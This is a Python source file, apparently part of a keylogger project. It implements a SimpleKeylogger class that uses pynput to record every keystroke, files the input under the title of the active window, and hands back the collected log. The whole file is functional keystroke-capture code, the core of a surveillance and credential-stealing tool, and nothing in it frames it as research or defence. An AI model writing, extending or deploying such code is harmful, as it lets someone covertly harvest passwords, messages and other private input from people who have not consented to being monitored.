from keylogger.interfaces import KeyloggerInterface
from pynput import keyboard
import pygetwindow as gw


def key_to_char(key):
    """Utility method that converts a pynput key to a printable character."""
    if isinstance(key, keyboard.KeyCode):
        return key.char  # Regular key (letters, numbers, symbols)

    # Mapping for special keys
    special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.esc: "[ESC]",
    }

    return special_keys.get(key, f"[{key.name}]")  # Default for unknown keys


class SimpleKeylogger(KeyloggerInterface):
    """keylogger implementation using pynput keyboard."""

    def __init__(self):
        self.buffer = {}
        self.running = False
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)

    def on_press(self, key):
        """Callback function for key press event."""
        try:
            key_pressed = key_to_char(key)
        except AttributeError:
            key_pressed = key.name

        active_window = self.get_active_window()

        if active_window not in self.buffer:
            self.buffer[active_window] = ''
        self.buffer[active_window] += key_pressed

    def on_release(self, key):
        """Callback function for key release event."""
        if key == keyboard.Key.esc:  # TODO: change to other keys maybe shortcut
            self.running = False
            return self.running

    def start(self):
        """Starts listening for keystrokes."""
        self.running = True
        self.listener.start()

    def stop(self):
        """Stops the keylogger."""
        self.running = False
        self.listener.stop()

    def get_log(self):
        """Returns the collected keystrokes."""
        log_data = self.buffer.copy()
        self.buffer.clear()
        return log_data

    def get_active_window(self) -> str:
        """Gets the title of the currently focused application."""
        try:
            return str(gw.getActiveWindow().title)
        except AttributeError:
            return "Unknown"
